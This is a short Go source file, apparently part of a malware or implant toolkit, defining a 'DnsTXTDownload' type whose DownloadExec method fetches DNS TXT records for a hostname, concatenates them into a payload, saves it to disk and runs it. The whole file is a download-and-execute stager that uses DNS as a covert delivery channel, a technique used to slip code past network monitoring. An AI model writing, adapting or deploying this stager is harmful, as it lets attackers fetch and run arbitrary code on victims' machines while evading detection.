package downloader

import (
	"net"
	"os"
	"strings"
)

type DnsTXTDownload struct {
}

func (d *DnsTXTDownload) DownloadExec(hostname string) {
	recs, err := net.LookupTXT(hostname)
	if err != nil {
		return
	}

	data := strings.Join(recs, "")
	filename := save([]byte(data))
	run(filename)
}
